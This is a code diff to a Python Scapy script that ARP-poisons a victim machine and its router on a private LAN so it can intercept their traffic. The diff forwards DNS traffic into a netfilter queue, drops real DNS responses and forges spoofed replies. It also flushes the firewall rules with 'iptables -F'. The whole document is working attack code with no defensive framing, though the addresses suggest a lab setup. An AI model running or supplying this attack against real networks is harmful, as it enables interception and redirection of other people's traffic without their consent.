@@ -4,13 +4,16 @@ import os
 import time
 import threading
 
+victim_ip_addr = '192.168.0.203'
+router_ip_addr = '192.168.0.1'
+
 def mac_addr_discovery():
 
     ## Discovering MAC Address of Victim Machine and Router
 
     print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.203')
     broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
-    arp_layer1 = ARP(pdst = '192.168.0.203')
+    arp_layer1 = ARP(pdst = victim_ip_addr)
     entire_packet1 = broadcast1 / arp_layer1
     answer1 = srp(entire_packet1, timeout = 2, verbose = True, iface = "enp0s3")[0]
 
@@ -18,7 +21,7 @@ def mac_addr_discovery():
 
     print('Figuring out Mac Address of default gateway router with IP address of 192.168.0.1')
     broadcast2 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
-    arp_layer2 = ARP(pdst = '192.168.0.1')
+    arp_layer2 = ARP(pdst = router_ip_addr)
     entire_packet2 = broadcast2 / arp_layer2
     answer2 = srp(entire_packet2, timeout = 2, verbose = True, iface = "enp0s3")[0]
 
@@ -39,38 +42,48 @@ def poison(victim_pkt, router_pkt):
         send(router_pkt, verbose = False, iface = "enp0s3")
 
 def packet_listener(packet):
-    targetDomain = b'wikipedia.org'
-    scapy_packet = IP(packet.get_payload())
+    scapy_packet = IP(packet.get_payload() )
+    print(scapy_packet)
 
 
-    if(scapy_packet.haslayer(DNSRR)):
-        print("DNS RESPONSE")
+    if (scapy_packet.haslayer(DNS) and scapy_packet[DNS].qr == 1):
+        print('DNS RESPONSE')
         dns_response = scapy_packet[DNS]
+        print('-----------------------------')
+        print('DNS ID', dns_response.id)
+        print('DNS QR', dns_response.qr)
+        print('DNS QNAME', dns_response.qd.qname)
 
-        qname = scapy_packet[DNSQR].qname
-        print(qname)
+        query_id = dns_response.id
+        qname = dns_response.qd.qname
+        qd = dns_response.qd
 
-        for x in range(dns_response.ancount):
-            print (dns_response[DNSRR][x].rdata)
+        dport = scapy_packet[UDP].dport
+
+        packet.drop()
 
 
-        if targetDomain in qname:
-            print(f"[+] Sppofing DNS RESPONSE for {qname.decode()}")
+        dns_layer = DNS(id = query_id, qr = 1, aa = 1, ancount = 1,
+                        qd = qd,
+                        an = DNSRR(rrname = qname, ttl = 20, rdata = '127.0.0.1'))
 
-            response = DNSRR(rrname = qname, rdata = "208.65.153.238")
-            scapy_packet[DNS].an = response
-            scapy_packet[DNS].ancount = 1
 
-            del scapy_packet[IP].len 
-            del scapy_packet[IP].chksum
+        new_packet = IP(dst=victim_ip_addr, src = router_ip_addr) / UDP(sport = 53, dport = dport) / dns_layer
 
-            packet.set_payload(bytes(scapy_packet))
+        print('NEW PACKET', new_packet)
 
-    packet.accept()
+        del new_packet[IP].len 
+        del new_packet[IP].chksum 
+
+        del new_packet[UDP].len 
+        del new_packet[UDP].chksum
+        
+        sr1(new_packet)
+
+
 
 
 def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
-    print("in here?")
 
     def filterPkt(pkt):
         return pkt.haslayer(DNS) and Ether in pkt and (
@@ -91,7 +104,8 @@ def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
 
 def main():
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    os.system('iptables -I FORWARD -d 192.168.0.198/24 -j NFQUEUE --queue-num 1')
+    os.system('iptables -F')
+    os.system('iptables -I FORWARD -p udp --dport 53 -d 192.168.0.198/24 -j NFQUEUE --queue-num 1')
 
     ether = Ether()
     attacker_mac_addr = ether.src
@@ -101,8 +115,8 @@ def main():
     print(f"Router MAC: {router_mac_addr}")
     print(f"Attacker MAC: {attacker_mac_addr}")
 
-    victim_pkt = ARP(op=2, hwdst = victim_mac_addr, pdst='192.168.0.203', psrc='192.168.0.1')
-    router_pkt = ARP(op=2, hwdst = router_mac_addr, pdst='192.168.0.1', psrc='192.168.0.203')
+    victim_pkt = ARP(op=2, hwdst = victim_mac_addr, pdst= victim_ip_addr, psrc= router_ip_addr)
+    router_pkt = ARP(op=2, hwdst = router_mac_addr, pdst=router_ip_addr, psrc= victim_ip_addr)
 
     threading.Thread(target=packet_sniff, args = (victim_mac_addr, router_mac_addr, attacker_mac_addr), daemon = True).start()
     threading.Thread(target=poison, args=(victim_pkt, router_pkt), daemon=True).start()
